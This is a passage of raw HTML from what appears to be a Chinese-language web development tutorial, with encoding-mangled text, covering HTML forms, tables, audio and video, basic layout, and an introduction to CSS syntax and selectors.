class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/submit&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>å§“åï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span>é‚®ç®±ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;gender&quot;</span>&gt;</span>æ€§åˆ«ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;male&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;gender&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span>ç”·<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;female&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;gender&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span>å¥³<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby&quot;</span>&gt;</span>çˆ±å¥½ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hobby1&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby[]&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;é˜…è¯»&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby1&quot;</span>&gt;</span>é˜…è¯»<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hobby2&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby[]&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;è¿åŠ¨&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby2&quot;</span>&gt;</span>è¿åŠ¨<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;æäº¤&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>input</code> æ ‡ç­¾è¡¨ç¤ºç”¨æˆ·è¾“å…¥å­—æ®µã€‚</li><li><code>label</code> æ ‡ç­¾ä¸è¡¨å•å…ƒç´ å…³è”ï¼Œç‚¹å‡»æ ‡ç­¾ä¼šèšç„¦åˆ°ç›¸åº”çš„è¾“å…¥å­—æ®µã€‚</li><li><code>input type=&quot;submit&quot;</code> ç”¨äºåˆ›å»ºæäº¤æŒ‰é’®ã€‚</li></ul><hr><h4 id="è¡¨å•æäº¤"><a href="#è¡¨å•æäº¤" class="headerlink" title="è¡¨å•æäº¤"></a>è¡¨å•æäº¤</h4><ul><li><code>action</code> å±æ€§æŒ‡å®šäº†è¡¨å•æäº¤çš„ç›®æ ‡ URLã€‚</li><li><code>method</code> å±æ€§å®šä¹‰äº†æäº¤æ–¹å¼ï¼ˆGET æˆ– POSTï¼‰ã€‚</li></ul><p>å½“ç”¨æˆ·å¡«å†™è¡¨å•å¹¶ç‚¹å‡»æäº¤æŒ‰é’®åï¼Œè¡¨å•ä¸­çš„æ•°æ®ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨è¿›è¡Œå¤„ç†ã€‚</p><hr><h3 id="HTML-è¡¨æ ¼"><a href="#HTML-è¡¨æ ¼" class="headerlink" title="HTML è¡¨æ ¼"></a>HTML è¡¨æ ¼</h3><p>è¡¨æ ¼ç”¨æ¥å±•ç¤ºç»“æ„åŒ–çš„æ•°æ®ï¼Œè¡¨æ ¼çš„åŸºæœ¬å…ƒç´ åŒ…æ‹¬ <code>&lt;table&gt;</code>ã€<code>&lt;tr&gt;</code>ï¼ˆè¡¨æ ¼è¡Œï¼‰ã€<code>&lt;th&gt;</code>ï¼ˆè¡¨å¤´ï¼‰ã€<code>&lt;td&gt;</code>ï¼ˆè¡¨æ ¼å•å…ƒæ ¼ï¼‰ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>å§“å<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>å¹´é¾„<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>åŸå¸‚<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>å¼ ä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>28<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>åŒ—äº¬<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>æå››<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>32<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>ä¸Šæµ·<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;th&gt;</code> ç”¨äºè¡¨å¤´ï¼Œé»˜è®¤æ˜¯åŠ ç²—ä¸”å±…ä¸­çš„ã€‚</li><li><code>&lt;td&gt;</code> ç”¨äºè¡¨æ ¼çš„æ¯ä¸ªå•å…ƒæ ¼ã€‚</li><li><code>border=&quot;1&quot;</code> ä¸ºè¡¨æ ¼æ·»åŠ è¾¹æ¡†ã€‚</li></ul><hr><h3 id="HTML-å¤šåª’ä½“"><a href="#HTML-å¤šåª’ä½“" class="headerlink" title="HTML å¤šåª’ä½“"></a>HTML å¤šåª’ä½“</h3><p>HTML æ”¯æŒåµŒå…¥å¤šåª’ä½“æ–‡ä»¶å¦‚éŸ³é¢‘å’Œè§†é¢‘ã€‚</p><h4 id="åµŒå…¥éŸ³é¢‘"><a href="#åµŒå…¥éŸ³é¢‘" class="headerlink" title="åµŒå…¥éŸ³é¢‘"></a>åµŒå…¥éŸ³é¢‘</h4><p>ä½¿ç”¨ <code>&lt;audio&gt;</code> æ ‡ç­¾åµŒå…¥éŸ³é¢‘æ–‡ä»¶ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;audio.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>    æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒéŸ³é¢‘æ ‡ç­¾ã€‚<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>controls</code> å±æ€§ä¸ºéŸ³é¢‘æ’­æ”¾å™¨æ·»åŠ æ’­æ”¾æ§åˆ¶æŒ‰é’®ã€‚</li></ul><h4 id="åµŒå…¥è§†é¢‘"><a href="#åµŒå…¥è§†é¢‘" class="headerlink" title="åµŒå…¥è§†é¢‘"></a>åµŒå…¥è§†é¢‘</h4><p>ä½¿ç”¨ <code>&lt;video&gt;</code> æ ‡ç­¾åµŒå…¥è§†é¢‘æ–‡ä»¶ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;video.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br>    æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒè§†é¢‘æ ‡ç­¾ã€‚<br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>width</code> å’Œ <code>height</code> è®¾ç½®è§†é¢‘çš„æ˜¾ç¤ºå°ºå¯¸ã€‚</li></ul><hr><h3 id="HTML-åŸºæœ¬å¸ƒå±€"><a href="#HTML-åŸºæœ¬å¸ƒå±€" class="headerlink" title="HTML åŸºæœ¬å¸ƒå±€"></a>HTML åŸºæœ¬å¸ƒå±€</h3><p>åœ¨ç½‘é¡µå¸ƒå±€ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ HTML çš„å—çº§å…ƒç´ å’Œè¡Œå†…å…ƒç´ </p><p>æ¥è®¾è®¡ç»“æ„ã€‚å¸¸ç”¨çš„å¸ƒå±€å…ƒç´ åŒ…æ‹¬ï¼š</p><ul><li><strong>å—çº§å…ƒç´ </strong>ï¼š<code>&lt;div&gt;</code>ã€<code>&lt;header&gt;</code>ã€<code>&lt;footer&gt;</code>ã€<code>&lt;section&gt;</code>ã€<code>&lt;article&gt;</code> ç­‰ï¼Œé»˜è®¤ç‹¬å ä¸€è¡Œã€‚</li><li><strong>è¡Œå†…å…ƒç´ </strong>ï¼š<code>&lt;span&gt;</code>ã€<code>&lt;a&gt;</code>ã€<code>&lt;img&gt;</code> ç­‰ï¼Œé»˜è®¤ä¸ä¼šæ¢è¡Œã€‚</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>ç½‘ç«™æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>é¦–é¡µ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/about&quot;</span>&gt;</span>å…³äº<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/contact&quot;</span>&gt;</span>è”ç³»æˆ‘ä»¬<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ä¸»è¦å†…å®¹åŒºåŸŸ<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è¿™é‡Œæ˜¯æ–‡ç« å†…å®¹ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-symbol">&amp;copy;</span> 2024 ç½‘ç«™ç‰ˆæƒæ‰€æœ‰<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;header&gt;</code> ç”¨äºé¡µé¢å¤´éƒ¨ã€‚</li><li><code>&lt;nav&gt;</code> ç”¨äºå¯¼èˆªæ ã€‚</li><li><code>&lt;section&gt;</code> è¡¨ç¤ºé¡µé¢ä¸­çš„ä¸€ä¸ªå†…å®¹å—ã€‚</li><li><code>&lt;footer&gt;</code> ç”¨äºé¡µé¢åº•éƒ¨ã€‚</li></ul><hr><h3 id="CSS-è¯¦å°½å…¥é—¨ä¸æŒ‡å—"><a href="#CSS-è¯¦å°½å…¥é—¨ä¸æŒ‡å—" class="headerlink" title="CSS è¯¦å°½å…¥é—¨ä¸æŒ‡å—"></a>CSS è¯¦å°½å…¥é—¨ä¸æŒ‡å—</h3><p><strong>CSSï¼ˆCascading Style Sheetsï¼Œå±‚å æ ·å¼è¡¨ï¼‰</strong> æ˜¯ç”¨æ¥æè¿° HTML å…ƒç´ å¦‚ä½•åœ¨å±å¹•ä¸Šå±•ç¤ºçš„æ ·å¼è¯­è¨€ã€‚é€šè¿‡ä½¿ç”¨ CSSï¼Œä½ å¯ä»¥æ§åˆ¶ç½‘é¡µçš„å¸ƒå±€ã€é¢œè‰²ã€å­—ä½“ã€å¯¹é½æ–¹å¼ã€åŠ¨ç”»ç­‰ã€‚CSS æ˜¯æ„å»ºç¾è§‚ã€ç°ä»£ç½‘é¡µçš„æ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€ï¼Œç»“åˆ HTML ä½¿ç”¨ï¼Œå¯ä»¥åˆ›å»ºå‡ºå¤æ‚ä¸”çµæ´»çš„ç½‘é¡µæ ·å¼</p><hr><h3 id="ç›®å½•-5"><a href="#ç›®å½•-5" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><ol><li><a href="#css-%E5%9F%BA%E7%A1%80">CSS åŸºç¡€</a><ul><li><a href="#%E5%BC%95%E5%85%A5-css">å¼•å…¥ CSS</a></li><li><a href="#css-%E8%AF%AD%E6%B3%95">CSS è¯­æ³•</a></li></ul></li><li><a href="#%E9%80%89%E6%8B%A9%E5%99%A8%E8%AF%A6%E8%A7%A3">é€‰æ‹©å™¨è¯¦è§£</a><ul><li><a href="#%E9%80%9A%E7%94%A8%E9%80%89%E6%8B%A9%E5%99%A8">é€šç”¨é€‰æ‹©å™¨</a></li><li><a href="#%E5%85%83%E7%B4%A0%E9%80%89%E6%8B%A9%E5%99%A8">å…ƒç´ é€‰æ‹©å™¨</a></li><li><a href="#%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8">ç±»é€‰æ‹©å™¨</a></li><li><a href="#id-%E9%80%89%E6%8B%A9%E5%99%A8">ID é€‰æ‹©å™¨</a></li><li><a href="#%E5%B1%9E%E6%80%A7%E9%80%89%E6%8B%A9%E5%99%A8">å±æ€§é€‰æ‹©å™¨</a></li><li><a href="#%E4%BC%AA%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8">ä¼ªç±»é€‰æ‹©å™¨</a></li><li><a href="#%E4%BC%AA%E5%85%83%E7%B4%A0%E9%80%89%E6%8B%A9%E5%99%A8">ä¼ªå…ƒç´ é€‰æ‹©å™¨</a></li></ul></li><li><a href="#css-%E7%9B%92%E6%A8%A1%E5%9E%8B">CSS ç›’æ¨¡å‹</a><ul><li><a href="#%E7%9B%92%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D">ç›’æ¨¡å‹ä»‹ç»</a></li><li><a href="#%E8%BE%B9%E8%B7%9Dmargin">è¾¹è·ï¼ˆMarginï¼‰</a></li><li><a href="#%E5%A1%AB%E5%85%85padding">å¡«å……ï¼ˆPaddingï¼‰</a></li><li><a href="#%E8%BE%B9%E6%A1%86border">è¾¹æ¡†ï¼ˆBorderï¼‰</a></li><li><a href="#%E5%86%85%E5%AE%B9%E5%8C%BA%E5%9F%9F">å†…å®¹åŒºåŸŸ</a></li></ul></li><li><a href="#css-%E5%B8%83%E5%B1%80">CSS å¸ƒå±€</a><ul><li><a href="#%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0%E4%B8%8E%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0">å—çº§å…ƒç´ ä¸è¡Œå†…å…ƒç´ </a></li><li><a href="#%E6%B5%AE%E5%8A%A8%E5%B8%83%E5%B1%80float">æµ®åŠ¨å¸ƒå±€ï¼ˆFloatï¼‰</a></li><li><a href="#%E5%BC%B9%E6%80%A7%E7%9B%92%E6%A8%A1%E5%9E%8Bflexbox">å¼¹æ€§ç›’æ¨¡å‹ï¼ˆFlexboxï¼‰</a></li><li><a href="#%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80grid">ç½‘æ ¼å¸ƒå±€ï¼ˆGridï¼‰</a></li></ul></li><li><a href="#%E5%B8%B8%E8%A7%81-css-%E5%B1%9E%E6%80%A7">å¸¸è§ CSS å±æ€§</a><ul><li><a href="#%E6%96%87%E6%9C%AC%E6%A0%B7%E5%BC%8F">æ–‡æœ¬æ ·å¼</a></li><li><a href="#%E8%83%8C%E6%99%AF%E6%A0%B7%E5%BC%8F">èƒŒæ™¯æ ·å¼</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%8E%E5%8F%AF%E8%A7%81%E6%80%A7">æ˜¾ç¤ºä¸å¯è§æ€§</a></li></ul></li><li><a href="#css-%E5%8A%A8%E7%94%BB%E4%B8%8E%E8%BF%87%E6%B8%A1">CSS åŠ¨ç”»ä¸è¿‡æ¸¡</a></li><li><a href="#%E5%93%8D%E5%BA%94%E5%BC%8F%E8%AE%BE%E8%AE%A1">å“åº”å¼è®¾è®¡</a><ul><li><a href="#%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2">åª’ä½“æŸ¥è¯¢</a></li></ul></li><li><a href="#css-%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7">CSS ä¼˜åŒ–æŠ€å·§</a></li></ol><hr><h3 id="CSS-åŸºç¡€"><a href="#CSS-åŸºç¡€" class="headerlink" title="CSS åŸºç¡€"></a>CSS åŸºç¡€</h3><h4 id="å¼•å…¥-CSS"><a href="#å¼•å…¥-CSS" class="headerlink" title="å¼•å…¥ CSS"></a>å¼•å…¥ CSS</h4><p>åœ¨ HTML ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼å¼•å…¥ CSSï¼Œæœ€å¸¸ç”¨çš„æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹å¼ï¼š</p><ol><li><strong>å†…è”æ ·å¼</strong>ï¼šåœ¨ HTML å…ƒç´ çš„ <code>style</code> å±æ€§ä¸­ç›´æ¥å®šä¹‰æ ·å¼ã€‚</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: red;&quot;</span>&gt;</span>è¿™æ˜¯çº¢è‰²çš„æ–‡å­—<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><strong>å†…éƒ¨æ ·å¼è¡¨</strong>ï¼šå°† CSS å†™åœ¨ HTML æ–‡ä»¶çš„ <code>&lt;style&gt;</code> æ ‡ç­¾å†…ï¼Œä½äº <code>&lt;head&gt;</code> éƒ¨åˆ†ã€‚</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: blue;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><strong>å¤–éƒ¨æ ·å¼è¡¨</strong>ï¼šå°† CSS æ ·å¼å†™åœ¨ç‹¬ç«‹çš„ <code>.css</code> æ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡ <code>&lt;link&gt;</code> æ ‡ç­¾å¼•å…¥ã€‚</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;styles.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>æ¨èä½¿ç”¨å¤–éƒ¨æ ·å¼è¡¨</strong>ï¼Œå› ä¸ºå®ƒå¯ä»¥å°†æ ·å¼ä¸å†…å®¹åˆ†ç¦»ï¼Œæ–¹ä¾¿ç®¡ç†å’Œç»´æŠ¤ã€‚</p><hr><h4 id="CSS-è¯­æ³•"><a href="#CSS-è¯­æ³•" class="headerlink" title="CSS è¯­æ³•"></a>CSS è¯­æ³•</h4><p>CSS çš„åŸºæœ¬è¯­æ³•ç”± <strong>é€‰æ‹©å™¨</strong> å’Œ <strong>å£°æ˜å—</strong> ç»„æˆã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">é€‰æ‹©å™¨ &#123;<br>    å±æ€§: å€¼;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¾‹å­</strong>ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: green;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>é€‰æ‹©å™¨ï¼ˆSelectorï¼‰</strong>ï¼šæŒ‡å®šéœ€è¦åº”ç”¨æ ·å¼çš„ HTML å…ƒç´ ã€‚</li><li><strong>å±æ€§ï¼ˆPropertyï¼‰</strong>ï¼šå®šä¹‰è¦æ”¹å˜çš„æ ·å¼å±æ€§ï¼Œå¦‚é¢œè‰²ã€å­—ä½“å¤§å°ç­‰ã€‚</li><li><strong>å€¼ï¼ˆValueï¼‰</strong>ï¼šä¸ºå±æ€§æä¾›å…·ä½“çš„æ ·å¼å€¼ã€‚</li></ul><hr><h3 id="é€‰æ‹©å™¨è¯¦è§£"><a href="#é€‰æ‹©å™¨è¯¦è§£" class="headerlink" title="é€‰æ‹©å™¨è¯¦è§£"></a>é€‰æ‹©å™¨è¯¦è§£</h3><p>CSS æä¾›äº†å¤šç§é€‰æ‹©å™¨ï¼Œç”¨äºé€‰æ‹© HTML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚é€šè¿‡é€‰æ‹©å™¨ï¼Œä½ å¯ä»¥ç²¾ç¡®æ§åˆ¶å“ªäº›å…ƒç´ åº”ç”¨ç‰¹å®šçš„æ ·å¼ã€‚</p><h4 id="é€šç”¨é€‰æ‹©å™¨"><a href="#é€šç”¨é€‰æ‹©å™¨" class="headerlink" title="é€šç”¨é€‰æ‹©å™¨"></a>é€šç”¨é€‰æ‹©å™¨</h4><p>é€šç”¨é€‰æ‹©å™¨ <code>*</code> ç”¨äºé€‰æ‹©æ‰€æœ‰å…ƒç´ ã€‚</p><figure class="highlight 